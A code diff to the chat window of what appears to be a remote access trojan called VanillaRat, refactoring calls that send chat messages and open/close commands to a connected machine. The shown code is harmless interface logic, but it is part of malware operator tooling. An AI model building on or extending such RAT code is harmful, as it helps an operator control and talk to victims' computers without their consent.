@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Text;
 using System.Windows.Forms;
+using VanillaRat.Classes;
 
 namespace VanillaRat.Forms
 {
@@ -18,15 +19,11 @@ namespace VanillaRat.Forms
         //Send message by button
         private void btnSend_Click(object sender, EventArgs e)
         {
-            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]" + txtSend.Text));
+            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]" + txtSend.Text));
             if (string.IsNullOrWhiteSpace(txtChat.Text))
-            {
                 txtChat.Text = "You: " + txtSend.Text;
-            }
             else
-            {
                 txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
-            }
             txtSend.Text = "";
         }
 
@@ -35,15 +32,11 @@ namespace VanillaRat.Forms
         {
             if (e.KeyCode == Keys.Enter)
             {
-                Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]" + txtSend.Text));
+                Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]" + txtSend.Text));
                 if (string.IsNullOrWhiteSpace(txtChat.Text))
-                {
                     txtChat.Text = "You: " + txtSend.Text;
-                }
                 else
-                {
                     txtChat.AppendText(Environment.NewLine + "You: " + txtSend.Text);
-                }
                 txtSend.Text = "";
             }
         }
@@ -51,14 +44,14 @@ namespace VanillaRat.Forms
         //On form close
         private void Chat_FormClosing(object sender, FormClosingEventArgs e)
         {
-            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("CloseChat"));
+            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("CloseChat"));
             Update = false;
         }
 
         //On form load
         private void Chat_Load(object sender, EventArgs e)
         {
-            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]Opened chat"));
+            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("[<MESSAGE>]Opened chat"));
         }
     }
 }
